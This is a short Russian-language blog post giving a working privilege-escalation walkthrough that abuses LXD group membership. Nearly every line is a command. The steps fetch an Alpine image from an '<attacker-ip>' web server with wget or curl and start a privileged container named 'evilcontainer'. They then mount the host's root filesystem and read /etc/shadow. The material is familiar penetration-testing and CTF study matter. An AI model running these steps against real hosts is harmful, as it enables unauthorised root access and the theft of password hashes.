# From LXC to Etc



Использование чистого lxc в природе сейчас встретишь не часто, но в некоторых дистрибутивах он есть, например в Ubuntu 20.04. 
И раз у нас есть такая крутая штука, то странно ей не воспользоваться.  
Вообще это довольно интересный и своеобразный вектор атаки, и пишут про него не особо часто (ну да, ведь везде docker).  

&lt;!--more--&gt;

## Собираем образ на своей машине
```shell
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

## Скачиваем файл
Полученный файл можно куда-то выгрузить, а можно раздать с веб-сервера, например так:
```shell
python3 -m http.server 8080
```

Забираем файл так:
```shell
wget http://&lt;attacker-ip&gt;:8080/alpine-v3.16-i686-20220603_1113.tar.gz
```

Или так:
```shell
curl http://&lt;attacker-ip&gt;:8080/alpine-v3.16-i686-20220603_1113.tar.gz --output alpine-v3.16-i686-20220603_1113.tar.gz
```

Как альтернативный вариант, можем использовать сразу образ из репозитория:
```shell
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

## Импортируем образ
```
lxc image import ./alpine*.tar.gz --alias evilimage
```

## Предварительно проверяем, используется ли lxc
```
ip a | grep lxd
lxc list
lxc image list
```

И если ничего нет, то запускаем начальную настройку:
```shell
lxd init
```

## Запускаем образ
```shell
lxc init evilimage evilcontainer -c security.privileged=true
```

## Монтируем /root в образ
```shell
lxc config device add evilcontainer victimdevice disk source=/ path=/mnt/root recursive=true
```

## Запускаем и радуемся результату
```shell
lxc start evilcontainer
lxc exec evilcontainer /bin/sh
cat /mnt/root/etc/shadow
```

### Reference
[lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)  
[Linux Privilege Escalation – Exploiting the LXC/LXD Groups](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/)



---

> Author:   
> URL: http://localhost:1313/posts/from-lxc-to-etc/  

